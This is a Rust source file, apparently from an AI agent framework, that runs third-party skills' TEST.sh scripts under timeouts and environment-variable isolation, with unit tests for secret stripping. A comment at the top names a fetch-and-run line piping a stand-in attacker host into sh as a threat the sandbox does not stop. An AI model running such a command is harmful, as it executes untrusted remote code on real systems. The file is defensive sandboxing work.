//! Sandbox verification for SkillForge-integrated skills.
//!
//! After SkillForge scouts, evaluates, and integrates a third-party skill,
//! we want one more check before exposing it to the agent: *does the skill
//! actually work?* This module runs the skill's `TEST.sh` (if any) under
//! hardened execution constraints:
//!
//! 1. **Per-test timeout** — an individual command that hangs cannot block
//!    the overall integration for more than `timeout_per_test`.
//! 2. **Environment isolation** — by default we strip inherited env vars and
//!    only forward an explicit allowlist (PATH, HOME, LANG, plus `TERM`
//!    which many CLIs require). Secrets like API tokens never leak into
//!    freshly-scouted third-party code.
//! 3. **Working directory pinning** — commands run with `skill_dir` as CWD
//!    and cannot escape to parent directories through relative paths alone.
//!
//! This is not a full seccomp/namespace sandbox — we can't provide that
//! portably. It is a pragmatic first line of defense: if a scouted skill
//! tries to `curl evil.com | sh`, we won't have blocked it, but we *will*
//! catch most broken/malformed skills and surface hangs instead of locking
//! the forge.

use crate::skills::testing::{
    self, SkillTestResult, TEST_FILE_NAME, TestCase, TestFailure, parse_test_line, pattern_matches,
};
use anyhow::{Context, Result};
use std::path::Path;
use std::time::Duration;
use tokio::process::Command;
use tokio::time::timeout;
use tracing::{debug, info, warn};

/// Tunable policy for the sandboxed test runner.
#[derive(Debug, Clone)]
pub struct SandboxPolicy {
    /// Max wall time for a single test command. When exceeded, the process
    /// is killed and the test is recorded as a failure.
    pub timeout_per_test: Duration,
    /// Maximum number of test commands to run before giving up.
    pub max_tests: usize,
    /// If `true`, the host's environment variables are *cleared* before each
    /// command runs and only [`SandboxPolicy::env_allowlist`] entries are
    /// forwarded. If `false`, the host env is inherited verbatim (useful for
    /// local dev / opt-out).
    pub isolate_env: bool,
    /// When `isolate_env` is `true`, only these env var names are copied
    /// from the host process into the sandboxed command.
    pub env_allowlist: Vec<String>,
}

impl SandboxPolicy {
    /// Strict default policy: 30s per test, at most 100 tests, full env isolation.
    pub fn strict() -> Self {
        Self {
            timeout_per_test: Duration::from_secs(30),
            max_tests: 100,
            isolate_env: true,
            env_allowlist: default_env_allowlist(),
        }
    }
}

impl Default for SandboxPolicy {
    fn default() -> Self {
        Self::strict()
    }
}

fn default_env_allowlist() -> Vec<String> {
    vec![
        "PATH".into(),
        "HOME".into(),
        "LANG".into(),
        "LC_ALL".into(),
        "TERM".into(),
    ]
}

/// Final verdict after running the sandbox over a skill.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum SandboxVerdict {
    /// The skill has no TEST.sh — accept with a warning.
    NoTests,
    /// All TEST.sh cases passed.
    Passed,
    /// One or more test cases failed (exit code mismatch, pattern mismatch,
    /// or timeout).
    Failed,
}

/// Full verification result combining the high-level verdict with raw test
/// output for logging/debugging.
#[derive(Debug, Clone)]
pub struct SandboxVerification {
    pub verdict: SandboxVerdict,
    pub results: SkillTestResult,
}

impl SandboxVerification {
    pub fn is_pass(&self) -> bool {
        matches!(
            self.verdict,
            SandboxVerdict::Passed | SandboxVerdict::NoTests
        )
    }
}

/// Run the skill's `TEST.sh` under the given sandbox policy.
///
/// Returns `Ok(SandboxVerification)` for every outcome that doesn't indicate
/// a programming bug (missing TEST.sh, failed tests, timeouts all return
/// `Ok`). Only I/O errors on the TEST.sh file itself propagate as `Err`.
pub async fn verify_skill_sandbox(
    skill_dir: &Path,
    skill_name: &str,
    policy: &SandboxPolicy,
) -> Result<SandboxVerification> {
    let test_file = skill_dir.join(TEST_FILE_NAME);
    if !test_file.exists() {
        debug!(
            skill = skill_name,
            path = %skill_dir.display(),
            "Sandbox: no TEST.sh, verdict=no_tests"
        );
        return Ok(SandboxVerification {
            verdict: SandboxVerdict::NoTests,
            results: SkillTestResult {
                skill_name: skill_name.to_string(),
                tests_run: 0,
                tests_passed: 0,
                failures: Vec::new(),
            },
        });
    }

    let content = std::fs::read_to_string(&test_file)
        .with_context(|| format!("failed to read {}", test_file.display()))?;

    let mut cases: Vec<TestCase> = content.lines().filter_map(parse_test_line).collect();
    if cases.len() > policy.max_tests {
        warn!(
            skill = skill_name,
            total = cases.len(),
            cap = policy.max_tests,
            "Sandbox: capping TEST.sh at max_tests"
        );
        cases.truncate(policy.max_tests);
    }

    let mut result = SkillTestResult {
        skill_name: skill_name.to_string(),
        tests_run: cases.len(),
        tests_passed: 0,
        failures: Vec::new(),
    };

    for case in &cases {
        match run_case_sandboxed(case, skill_dir, policy).await {
            Ok(()) => result.tests_passed += 1,
            Err(failure) => result.failures.push(failure),
        }
    }

    let verdict = if result.failures.is_empty() {
        SandboxVerdict::Passed
    } else {
        SandboxVerdict::Failed
    };

    info!(
        skill = skill_name,
        run = result.tests_run,
        passed = result.tests_passed,
        failed = result.failures.len(),
        verdict = ?verdict,
        "Sandbox verification complete"
    );

    Ok(SandboxVerification {
        verdict,
        results: result,
    })
}

/// Run a single test case with timeout + env isolation. Returns `Ok(())` on
/// pass or `Err(TestFailure)` describing why it failed.
async fn run_case_sandboxed(
    case: &TestCase,
    skill_dir: &Path,
    policy: &SandboxPolicy,
) -> std::result::Result<(), TestFailure> {
    let mut cmd = Command::new("sh");
    cmd.arg("-c")
        .arg(&case.command)
        .current_dir(skill_dir)
        .kill_on_drop(true);

    if policy.isolate_env {
        cmd.env_clear();
        for key in &policy.env_allowlist {
            if let Ok(val) = std::env::var(key) {
                cmd.env(key, val);
            }
        }
    }

    let exec = cmd.output();
    let output = match timeout(policy.timeout_per_test, exec).await {
        Ok(Ok(o)) => o,
        Ok(Err(e)) => {
            return Err(TestFailure {
                command: case.command.clone(),
                expected_exit: case.expected_exit,
                actual_exit: -1,
                expected_pattern: case.expected_pattern.clone(),
                actual_output: format!("failed to execute command: {e}"),
            });
        }
        Err(_elapsed) => {
            return Err(TestFailure {
                command: case.command.clone(),
                expected_exit: case.expected_exit,
                actual_exit: -1,
                expected_pattern: case.expected_pattern.clone(),
                actual_output: format!("timeout after {}s", policy.timeout_per_test.as_secs()),
            });
        }
    };

    let actual_exit = output.status.code().unwrap_or(-1);
    let stdout = String::from_utf8_lossy(&output.stdout);
    let stderr = String::from_utf8_lossy(&output.stderr);
    let combined = format!("{stdout}{stderr}");

    let exit_ok = actual_exit == case.expected_exit;
    let pattern_ok = pattern_matches(&combined, &case.expected_pattern);

    if exit_ok && pattern_ok {
        Ok(())
    } else {
        Err(TestFailure {
            command: case.command.clone(),
            expected_exit: case.expected_exit,
            actual_exit,
            expected_pattern: case.expected_pattern.clone(),
            actual_output: combined.to_string(),
        })
    }
}

/// Re-export for completeness — callers building their own report can pretty
/// print via the existing skills::testing helpers.
pub use testing::print_results;

#[cfg(test)]
mod tests {
    use super::*;
    use std::fs;
    use tempfile::TempDir;

    fn write_test_file(dir: &Path, contents: &str) {
        fs::write(dir.join(TEST_FILE_NAME), contents).unwrap();
    }

    #[tokio::test]
    async fn verdict_is_no_tests_when_test_file_missing() {
        let tmp = TempDir::new().unwrap();
        let skill_dir = tmp.path().join("no-tests");
        fs::create_dir_all(&skill_dir).unwrap();

        let v = verify_skill_sandbox(&skill_dir, "no-tests", &SandboxPolicy::strict())
            .await
            .unwrap();
        assert_eq!(v.verdict, SandboxVerdict::NoTests);
        assert!(v.is_pass());
    }

    #[tokio::test]
    async fn verdict_is_passed_for_good_test() {
        let tmp = TempDir::new().unwrap();
        let skill_dir = tmp.path().join("ok");
        fs::create_dir_all(&skill_dir).unwrap();
        write_test_file(&skill_dir, "echo hello | 0 | hello\n");

        let v = verify_skill_sandbox(&skill_dir, "ok", &SandboxPolicy::strict())
            .await
            .unwrap();
        assert_eq!(v.verdict, SandboxVerdict::Passed);
        assert_eq!(v.results.tests_run, 1);
        assert_eq!(v.results.tests_passed, 1);
    }

    #[tokio::test]
    async fn verdict_is_failed_on_exit_mismatch() {
        let tmp = TempDir::new().unwrap();
        let skill_dir = tmp.path().join("fail");
        fs::create_dir_all(&skill_dir).unwrap();
        write_test_file(&skill_dir, "false | 0 | \n");

        let v = verify_skill_sandbox(&skill_dir, "fail", &SandboxPolicy::strict())
            .await
            .unwrap();
        assert_eq!(v.verdict, SandboxVerdict::Failed);
        assert_eq!(v.results.failures.len(), 1);
    }

    #[tokio::test]
    async fn timeout_is_recorded_as_failure() {
        let tmp = TempDir::new().unwrap();
        let skill_dir = tmp.path().join("hang");
        fs::create_dir_all(&skill_dir).unwrap();
        write_test_file(&skill_dir, "sleep 5 | 0 | \n");

        let policy = SandboxPolicy {
            timeout_per_test: Duration::from_millis(300),
            ..SandboxPolicy::strict()
        };

        let v = verify_skill_sandbox(&skill_dir, "hang", &policy)
            .await
            .unwrap();
        assert_eq!(v.verdict, SandboxVerdict::Failed);
        assert_eq!(v.results.failures.len(), 1);
        assert!(v.results.failures[0].actual_output.contains("timeout"));
    }

    #[tokio::test]
    async fn env_isolation_blocks_secret_env_var() {
        let tmp = TempDir::new().unwrap();
        let skill_dir = tmp.path().join("env");
        fs::create_dir_all(&skill_dir).unwrap();

        // The test command prints $SECRET — with isolation enabled the var
        // should be missing (empty output), causing the pattern "leaked" to
        // mismatch.
        write_test_file(&skill_dir, "echo \"val=${SECRET}end\" | 0 | val=end\n");

        // SAFETY: setting env vars in tests must use unsafe in recent Rust editions.
        unsafe {
            std::env::set_var("SECRET", "leaked");
        }

        // With strict isolation (SECRET not in allowlist), the variable is
        // unset inside the sandbox and the test passes.
        let strict = SandboxPolicy::strict();
        let v = verify_skill_sandbox(&skill_dir, "env", &strict)
            .await
            .unwrap();
        assert_eq!(
            v.verdict,
            SandboxVerdict::Passed,
            "SECRET should have been stripped: {:?}",
            v.results.failures
        );

        // With isolation disabled, SECRET leaks through and the test fails
        // because the pattern no longer matches.
        let lax = SandboxPolicy {
            isolate_env: false,
            ..SandboxPolicy::strict()
        };
        let v = verify_skill_sandbox(&skill_dir, "env", &lax).await.unwrap();
        assert_eq!(v.verdict, SandboxVerdict::Failed);

        unsafe {
            std::env::remove_var("SECRET");
        }
    }

    #[tokio::test]
    async fn env_allowlist_passes_path_through() {
        let tmp = TempDir::new().unwrap();
        let skill_dir = tmp.path().join("path");
        fs::create_dir_all(&skill_dir).unwrap();
        // PATH must be passed through so `sh` can find coreutils like `echo`.
        // If PATH weren't in the allowlist, this test would fail.
        write_test_file(&skill_dir, "echo ok | 0 | ok\n");

        let v = verify_skill_sandbox(&skill_dir, "path", &SandboxPolicy::strict())
            .await
            .unwrap();
        assert_eq!(v.verdict, SandboxVerdict::Passed);
    }

    #[tokio::test]
    async fn max_tests_cap_is_applied() {
        let tmp = TempDir::new().unwrap();
        let skill_dir = tmp.path().join("many");
        fs::create_dir_all(&skill_dir).unwrap();

        // Generate more tests than the cap allows.
        let mut s = String::new();
        for _ in 0..5 {
            s.push_str("echo ok | 0 | ok\n");
        }
        write_test_file(&skill_dir, &s);

        let policy = SandboxPolicy {
            max_tests: 2,
            ..SandboxPolicy::strict()
        };
        let v = verify_skill_sandbox(&skill_dir, "many", &policy)
            .await
            .unwrap();
        assert_eq!(v.verdict, SandboxVerdict::Passed);
        assert_eq!(v.results.tests_run, 2, "should be capped");
    }

    #[tokio::test]
    async fn multiple_cases_mixed_outcomes() {
        let tmp = TempDir::new().unwrap();
        let skill_dir = tmp.path().join("mixed");
        fs::create_dir_all(&skill_dir).unwrap();
        write_test_file(
            &skill_dir,
            "echo hello | 0 | hello\nfalse | 0 | \n# comment\necho world | 0 | world\n",
        );

        let v = verify_skill_sandbox(&skill_dir, "mixed", &SandboxPolicy::strict())
            .await
            .unwrap();
        assert_eq!(v.verdict, SandboxVerdict::Failed);
        assert_eq!(v.results.tests_run, 3);
        assert_eq!(v.results.tests_passed, 2);
        assert_eq!(v.results.failures.len(), 1);
    }

    #[test]
    fn default_policy_is_strict() {
        let p = SandboxPolicy::default();
        assert!(p.isolate_env);
        assert!(p.env_allowlist.contains(&"PATH".to_string()));
        assert!(p.timeout_per_test <= Duration::from_secs(120));
    }

    #[test]
    fn is_pass_covers_passed_and_no_tests() {
        let passed = SandboxVerification {
            verdict: SandboxVerdict::Passed,
            results: SkillTestResult {
                skill_name: "x".into(),
                tests_run: 1,
                tests_passed: 1,
                failures: vec![],
            },
        };
        assert!(passed.is_pass());

        let notests = SandboxVerification {
            verdict: SandboxVerdict::NoTests,
            results: SkillTestResult {
                skill_name: "x".into(),
                tests_run: 0,
                tests_passed: 0,
                failures: vec![],
            },
        };
        assert!(notests.is_pass());

        let failed = SandboxVerification {
            verdict: SandboxVerdict::Failed,
            results: SkillTestResult {
                skill_name: "x".into(),
                tests_run: 1,
                tests_passed: 0,
                failures: vec![TestFailure {
                    command: "".into(),
                    expected_exit: 0,
                    actual_exit: 1,
                    expected_pattern: "".into(),
                    actual_output: "".into(),
                }],
            },
        };
        assert!(!failed.is_pass());
    }
}
